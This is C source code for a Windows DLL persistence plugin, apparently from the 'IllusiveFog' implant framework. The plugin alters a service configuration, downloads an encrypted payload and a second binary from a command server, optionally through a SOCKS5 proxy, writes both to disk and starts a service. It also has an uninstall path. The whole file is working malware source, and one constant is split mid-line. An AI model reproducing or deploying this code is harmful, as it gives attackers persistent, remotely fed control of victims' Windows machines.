#include "persistence.h"
extern char pellet_dir[] = "/api/tp/roze.j";
extern char bin_dir[] = "/api/cox";
extern char bin_host_param[] = "i=1";

__declspec(dllexport) void run_ld(HANDLE local_event) {
	MSG msg;
	enum pellet_ec pelec;
	char* preffered_path = NULL;
	char* pellet = NULL;
	char* drp = NULL;
	DWORD get_size = 0;
	DWORD written_size = 0;
	ULONG results = 0;
	DWORD pellet_size = 0;
	Ppellet_info  pinfo = NULL;
	char* temp = NULL;
	enum persis_method method;
	enum persis_op operation;
	char* http_delimiter = "\r\n\r\n";
	while (!PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)) {
		SetEvent(local_event);
		GetMessage(&msg, NULL, NULL, NULL);
		if (msg.message == WM_
			_PLUGIN_LAUNCH) {
			Pplugin_param param = (Pplugin_param)msg.lParam;
			method = select_methods(param->param);
			operation = select_operation(param->param);
			Ppellet_dirs pdirs = get_persist_locations(method);
			if (method == winipt || method == winrm && operation == install) {
				if (method == winrm) {

					if (!change_service_config()) {
						report_ec(persist_failed_change_server, param->reporter_event, param->reporter_threadid);
						goto cleanup;
					}
				}

#ifdef SOCKS5
				Psocket_address psockaddr = form_socket_address(param->pellet_struct->socks_ip, param->pellet_struct->sockport, param->pellet_struct->dest_ip, param->pellet_struct->destport, param->pellet_struct->enable_auth, param->pellet_struct->auth_user_id, param->pellet_struct->auth_user_pass);
#else
				Psocket_address psockaddr = form_socket_address(NULL, NULL, param->pellet_struct->dest_ip, param->pellet_struct->destport, param->pellet_struct->enable_auth, param->pellet_struct->auth_user_id, param->pellet_struct->auth_user_pass);
#endif
				pinfo = form_pellet_info(pinfo, param->pellet_struct->agent_id, pellet_dir, bin_dir, NULL);
				pellet = pellet_get_pellet(psockaddr, pinfo->pellet_dir, pellet, &results, get_size, &written_size);

				pellet = pellet_xcrypt_pellet(pellet, param->pellet_struct->pellet_key, &pellet_size);

				if ((pwrite_file(pdirs->pellet_write_loc, pellet_size, pellet)) != pellet_ec_code_success) {

					freeheap(pellet);
					free_pellet_info(pinfo);
					free_socket_address(psockaddr);
					free_persist_locations(pdirs);
					report_ec(pellet_ec_file_write_failed, param->reporter_event, param->reporter_threadid);
					continue;


				}

				freeheap(pellet);

				drp = pellet_get_post_pellet(psockaddr, bin_dir, bin_host_param, drp, &results, get_size, &written_size);
				temp = strstrA(&drp[10], http_delimiter);
				temp += 4;
				results = 0;

				if ((pwrite_file(pdirs->bin_write_loc, written_size, temp)) != pellet_ec_code_success) {

					freeheap(pellet);
					free_pellet_info(pinfo);
					free_socket_address(psockaddr);
					freeheap(drp);
					free_persist_locations(pdirs);
					report_ec(pellet_ec_file_write_failed, param->reporter_event, param->reporter_threadid);
					continue;


				}
				start_service();
				free_persist_locations(pdirs);
				free_socket_address(psockaddr);
				freeheap(drp);
			}
			else if (method == winipt || method == winrm && operation == uninstall) {

				pdelete_file(pdirs->pellet_write_loc);


			}
			cleanup:
			operation = no_operation;
			method = persist_no_method;
			report(param->reporter_event, param->reporter_threadid, NULL);
			SetEvent(local_event);
			ResetEvent(local_event);
			continue;
		}
		else if (msg.message == WM_IllusiveFog_PLUGIN_TERMINATE) {
			
			ExitThread(0);
		}
	}
}


BOOL  DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

